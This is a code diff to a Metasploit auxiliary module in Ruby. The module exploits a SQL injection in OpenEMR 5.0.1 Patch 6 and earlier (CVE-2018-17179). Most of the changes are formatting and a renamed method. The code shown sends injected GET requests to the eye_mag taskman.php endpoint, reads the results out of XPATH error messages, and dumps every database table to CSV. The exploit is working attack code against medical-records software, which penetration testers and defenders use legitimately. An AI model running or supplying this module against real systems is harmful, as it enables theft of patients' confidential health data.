@@ -10,32 +10,29 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::SQLi
 
   def initialize(info = {})
-    super(
-      update_info(
-        info,
-        'Name' => 'OpenEMR 5.0.1 Patch 6 SQLi Dump',
-        'Description' => %q{
-          This module exploits a SQLi vulnerability found in
-          OpenEMR version 5.0.1 Patch 6 and lower. The
-          vulnerability allows the contents of the entire
-          database (with exception of log and task tables) to be
-          extracted.
-          This module saves each table as a `.csv` file in your
-          loot directory and has been tested with
-          OpenEMR 5.0.1 (3).
-        },
-        'License' => MSF_LICENSE,
-        'Author' =>
-          [
-            'Will Porter <will.porter[at]lodestonesecurity.com>'
-          ],
-        'References' => [
-          ['CVE', '2018-17179'],
-          ['URL', 'https://github.com/openemr/openemr/commit/3e22d11c7175c1ebbf3d862545ce6fee18f70617']
+    super(update_info(info,
+      'Name' => 'OpenEMR 5.0.1 Patch 6 SQLi Dump',
+      'Description' => '
+        This module exploits a SQLi vulnerability found in
+        OpenEMR version 5.0.1 Patch 6 and lower. The
+        vulnerability allows the contents of the entire
+        database (with exception of log and task tables) to be
+        extracted.
+        This module saves each table as a `.csv` file in your
+        loot directory and has been tested with
+        OpenEMR 5.0.1 (3).
+      ',
+      'License' => MSF_LICENSE,
+      'Author' =>
+        [
+          'Will Porter <will.porter[at]lodestonesecurity.com>'
         ],
-        'DisclosureDate' => 'May 17 2019'
-      )
-    )
+      'References' => [
+        ['CVE', '2018-17179'],
+        ['URL', 'https://github.com/openemr/openemr/commit/3e22d11c7175c1ebbf3d862545ce6fee18f70617']
+      ],
+      'DisclosureDate' => 'May 17 2019'
+    ))
 
     register_options(
       [
@@ -76,7 +73,7 @@ class MetasploitModule < Msf::Auxiliary
     Exploit::CheckCode::Appears
   end
 
-  def send_sqli_request(payload)
+  def get_response(payload)
     send_request_cgi(
       'method' => 'GET',
       'uri' => normalize_uri(uri, 'interface', 'forms', 'eye_mag', 'taskman.php'),
@@ -115,7 +112,7 @@ class MetasploitModule < Msf::Auxiliary
       verbose: datastore['VERBOSE']
     }
     sqli = MySQLi.new(sqli_opts) do |payload|
-      res = send_sqli_request(payload)
+      res = get_response(payload)
       if res && (response = res.body[%r{XPATH syntax error: '~(.*?)'</font>}m, 1])
         response
       else
@@ -125,7 +122,7 @@ class MetasploitModule < Msf::Auxiliary
     unless sqli.test_vulnerable
       fail_with Failure::NotVulnerable, 'The target does not seem vulnerable.'
     end
-    print_good "The target seems vulnerable."
+    print_good 'The target seems vulnerable.'
     db_version = sqli.version
     print_status("DB Version: #{db_version}")
     print_status('Enumerating tables, this may take a moment...')
@@ -136,7 +133,6 @@ class MetasploitModule < Msf::Auxiliary
     skiptables = %w[form_taskman log log_comment_encrypt]
     # large table containing text in different languages, >4mb in size
     skiptables << 'lang_definitions'
-
     tables.each_with_index do |table, i|
       if skiptables.include?(table)
         print_status("Skipping table (#{i + 1}/#{num_tables}): #{table}")
